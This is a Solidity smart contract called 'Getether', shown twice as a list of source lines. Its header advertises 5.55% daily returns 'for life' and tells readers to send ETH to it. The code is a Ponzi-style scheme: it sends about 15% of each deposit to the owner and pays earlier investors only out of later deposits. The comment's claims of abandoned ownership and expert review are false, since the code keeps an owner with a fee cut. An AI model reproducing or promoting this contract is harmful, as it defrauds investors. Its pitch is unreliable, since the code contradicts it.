['pragma solidity ^0.4.25;\n', '/**\n', '*\n', '*  -----------------------------------------Welcome to "GETETHER"----------------------------------------\n', '*\n', '*  -----------------------------------DECENTRALIZED INVESTMENT PROJECT-----------------------------------\n', '*\n', '*   GAIN 5,55% per 24 HOURS (EVERY 5900 blocks Ethereum)\n', '*   Life-long payments\n', '*   Simple and reliable smart contract code\n', '*\n', '*   Web               - https://getether.me\n', '*   Twitter          - https://twitter.com/_getether_\n', '*   LinkedIn \t    - https://www.linkedin.com/in/get-ether-037833170/\n', '*   Medium        - https://medium.com/@ getether/\n', '*   Facebook \t    - https://www.facebook.com/get.ether\n', '*   Instagram\t    - https://www.instagram.com/getether.me\n', '*\n', '*  -----------------------------------------About the GETETHER-------------------------------------------\n', '*\n', '*   DECENTRALIZED INVESTMENT PROJECT\n', '*   PAYMENTS 5,55% DAILY\n', '*   INVESTMENTS BASED ON TECHNOLOGY Smart Contract Blockchain Ethereum!\n', '*   Open source code.\n', '*   Implemented the function of abandonment of ownership\n', '* \n', '*  -----------------------------------------Usage rules---------------------------------------------------\n', '*\n', '*  1. Send any amount from 0.01 ETH  from ETH wallet to the smart contract address \n', '*     \n', '*  2. Verify your transaction on etherscan.io, specifying the address of your wallet.\n', '*\n', '*  3. Claim your profit in ETH by sending 0 ETH  transaction every 24 hours.\n', '*  \n', '*  4. In order to make a reinvest in the project, you must first remove the interest of your accruals\n', '*\t  (done by sending 0 ETH from the address of which you invested, and only then send a new Deposit)\n', '*  \n', '*   RECOMMENDED GAS LIMIT: 70000\n', '*   RECOMMENDED GAS PRICE view on: https://ethgasstation.info/\n', '*   You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.\n', '*\n', '*  -----------------------------------------ATTENTION !!! -------------------------------------------------\n', '*   It is not allowed to make transfers from any exchanges! only from your personal ETH wallet, \n', '*\tfrom which you have a private key!\n', '* \n', '*   The contract was reviewed and approved by the pros in the field of smart contracts!\n', '*/\n', 'contract Getether {\n', '    address owner;\n', '\n', '    function Getether() {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    mapping (address => uint256) balances;\n', '    mapping (address => uint256) timestamp;\n', '\n', '    function() external payable {\n', '        owner.send((msg.value * 100)/666);\n', '        if (balances[msg.sender] != 0){\n', '        address kashout = msg.sender;\n', '        uint256 getout = balances[msg.sender]*111/2000*(block.number-timestamp[msg.sender])/5900;\n', '        kashout.send(getout);\n', '        }\n', '\n', '        timestamp[msg.sender] = block.number;\n', '        balances[msg.sender] += msg.value;\n', '\n', '    }\n', '}']
['pragma solidity ^0.4.25;\n', '/**\n', '*\n', '*  -----------------------------------------Welcome to "GETETHER"----------------------------------------\n', '*\n', '*  -----------------------------------DECENTRALIZED INVESTMENT PROJECT-----------------------------------\n', '*\n', '*   GAIN 5,55% per 24 HOURS (EVERY 5900 blocks Ethereum)\n', '*   Life-long payments\n', '*   Simple and reliable smart contract code\n', '*\n', '*   Web               - https://getether.me\n', '*   Twitter          - https://twitter.com/_getether_\n', '*   LinkedIn \t    - https://www.linkedin.com/in/get-ether-037833170/\n', '*   Medium        - https://medium.com/@ getether/\n', '*   Facebook \t    - https://www.facebook.com/get.ether\n', '*   Instagram\t    - https://www.instagram.com/getether.me\n', '*\n', '*  -----------------------------------------About the GETETHER-------------------------------------------\n', '*\n', '*   DECENTRALIZED INVESTMENT PROJECT\n', '*   PAYMENTS 5,55% DAILY\n', '*   INVESTMENTS BASED ON TECHNOLOGY Smart Contract Blockchain Ethereum!\n', '*   Open source code.\n', '*   Implemented the function of abandonment of ownership\n', '* \n', '*  -----------------------------------------Usage rules---------------------------------------------------\n', '*\n', '*  1. Send any amount from 0.01 ETH  from ETH wallet to the smart contract address \n', '*     \n', '*  2. Verify your transaction on etherscan.io, specifying the address of your wallet.\n', '*\n', '*  3. Claim your profit in ETH by sending 0 ETH  transaction every 24 hours.\n', '*  \n', '*  4. In order to make a reinvest in the project, you must first remove the interest of your accruals\n', '*\t  (done by sending 0 ETH from the address of which you invested, and only then send a new Deposit)\n', '*  \n', '*   RECOMMENDED GAS LIMIT: 70000\n', '*   RECOMMENDED GAS PRICE view on: https://ethgasstation.info/\n', '*   You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.\n', '*\n', '*  -----------------------------------------ATTENTION !!! -------------------------------------------------\n', '*   It is not allowed to make transfers from any exchanges! only from your personal ETH wallet, \n', '*\tfrom which you have a private key!\n', '* \n', '*   The contract was reviewed and approved by the pros in the field of smart contracts!\n', '*/\n', 'contract Getether {\n', '    address owner;\n', '\n', '    function Getether() {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    mapping (address => uint256) balances;\n', '    mapping (address => uint256) timestamp;\n', '\n', '    function() external payable {\n', '        owner.send((msg.value * 100)/666);\n', '        if (balances[msg.sender] != 0){\n', '        address kashout = msg.sender;\n', '        uint256 getout = balances[msg.sender]*111/2000*(block.number-timestamp[msg.sender])/5900;\n', '        kashout.send(getout);\n', '        }\n', '\n', '        timestamp[msg.sender] = block.number;\n', '        balances[msg.sender] += msg.value;\n', '\n', '    }\n', '}']